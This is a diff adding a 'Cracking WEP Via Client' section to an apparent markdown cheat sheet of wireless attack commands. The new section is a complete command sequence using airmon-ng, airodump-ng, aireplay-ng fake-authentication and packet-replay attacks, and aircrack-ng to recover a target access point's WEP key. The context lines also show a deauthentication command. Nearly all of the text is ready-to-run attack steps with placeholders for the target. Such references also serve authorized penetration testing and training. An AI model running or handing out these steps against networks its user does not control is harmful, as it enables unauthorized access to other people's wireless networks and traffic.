@@ -68,3 +68,29 @@ aireplay -0 1 -a <AP MAC> -c <Victim MAC> wlan0
 aircrack-ng -0 <filename>
 ```
 
+### Cracking WEP Via Client
+
+```text
+########## Cracking WEP Via Client ########## 
+#enter monitor mode
+airmon-ng start wlan0 <AP Channel>
+
+#capture dump of target AP  
+airodump-ng -c <channel> --bssid <MAC> -w <file-name> wlan0
+
+#associate your MAC with AP (fake auth attack)
+aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> wlan0
+
+#interactive packet replay attack 
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 wlan0
+
+#refined interactive replay attack
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0
+
+#replay the interactive replay attack to collect weak IVs
+aireplay-ng -2 -r <capture filename> wlan0
+
+#crack WEP Key
+aircrack-ng -0 -z -n 64 <file-name>
+```
+
